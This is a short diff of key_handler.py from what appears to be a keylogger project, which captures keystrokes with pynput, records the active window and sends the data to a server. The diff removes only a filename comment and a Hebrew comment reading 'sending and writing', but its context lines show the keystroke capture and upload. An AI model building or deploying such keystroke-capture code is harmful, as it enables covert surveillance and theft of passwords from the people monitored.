@@ -1,5 +1,3 @@
-# key_handler.py
-
 from pynput.keyboard import Listener, Key
 from logger import Logger
 from window_utils import get_active_window_title, get_keyboard_layout, get_character_from_vk_code
@@ -81,7 +79,6 @@ class KeyLogger:
             "active_window": active_window_to_send
         }
 
-        # שליחה וכתיבה
         self.logger.send_to_server(json_data)
 
         log_line = f"{line}  [{timestamp}]"
